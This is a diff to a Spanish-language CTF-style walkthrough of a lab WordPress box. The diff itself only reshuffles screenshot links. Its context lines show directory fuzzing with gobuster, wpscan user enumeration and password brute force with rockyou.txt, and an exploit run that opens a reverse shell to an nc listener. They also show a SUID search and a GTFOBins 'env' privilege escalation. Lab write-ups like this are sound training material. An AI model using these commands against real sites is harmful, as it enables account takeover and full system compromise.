@@ -58,15 +58,17 @@ segundo fuzzing a wordpress.
 ```bash
 gobuster dir -u 172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,sh,py,txt,bak,zip
 ```
+![gobusword](3coma5.png)
 
-![gobusword](4.png)
+
 
 
 Lo primero que vamos hacer revisar las paginas que nos aparecen, 
 entre ellas una que nos interesa es el directorio /wordpress/wp-
 login.php 
+![gobusword](4.png)
 
-![wplogin](5.png)
+
 
 
 4. Auditoria con wpscan
@@ -86,13 +88,14 @@ echo 'export WPSCAN_API_TOKEN'
 ```bash
 wpscan --url http://172.17.0.2/wordpress/ --enumerate u                  
 ```
+![wplogin](5.png)
 
-![wpscan](6.png)
 
 
 Con el escaneo encontramos un usuario:
 
-![userwp](7.png)
+![wpscan](6.png)
+
 
 ahora realizamos un ataque de fuerza bruta con wpscan al usuario 
 mario:
@@ -101,8 +104,8 @@ mario:
 wpscan --url http://172.17.0.2/wordpress/ --passwords /usr/share/wordlists/rockyou.txt --usernames marrio
 ```
 
+![userwp](7.png)
 ![wpbrute](8.png)
-![wpbrute](9.png)
 
 Tambien podemos enumerar plugins y temas para encontrar alguno con 
 alguna vulnerabilidad:
@@ -111,8 +114,8 @@ alguna vulnerabilidad:
 wpscan --url http://172.17.0.2/wordpress/ --enumerate ap,at
 ```
 
+![wpbrute](9.png)
 ![wpbrute](10.png)
-![wpbrute](11.png)
 
 
 5. Reverse shell y escalada de privilegios.
@@ -129,7 +132,8 @@ pestaña realizamos el exploit.
 python3 wpte_exploit.py http://172.17.0.1/ mario love twentyfifteen 172.17.0.1 4444 linux
 ```
 
-![exploit](12.png)
+![wpbrute](11.png)
+
 
 
 Y una vez realizado el exploit obtenemos una reverse shell.
@@ -142,21 +146,22 @@ nc -lvnp 4444
 python3 -c 'import pty,os; pty.spawn("/bin/bash")' 2>/dev/null || true
 export TERM=xterm; stty rows 40 columns 120
 ```
+![exploit](12.png)
 
-![tty](13.png)
 
 
 NOTA: realize una series de comandos para estabilizar la 
 tty.
 
 Empezamos a realizar una enumeración manual.
+![tty](13.png)
 
-![enum](14.png)
 
 ```bash
 find  / -perm -4000 -type f 2>/dev/null
 ```
-![suid](15.png)
+![enum](14.png)
+
 
 
 
@@ -169,6 +174,8 @@ usuario que lo ejecuta.
 Con esta busqueda podemos dirigirnos a la pagina 
 https://gtfobins.github.io/ y buscamos el binario env, con este 
 binario vamos a poder escalar privilegios.
+![suid](15.png)
+
 
 ![gtfobins](16.png)
 
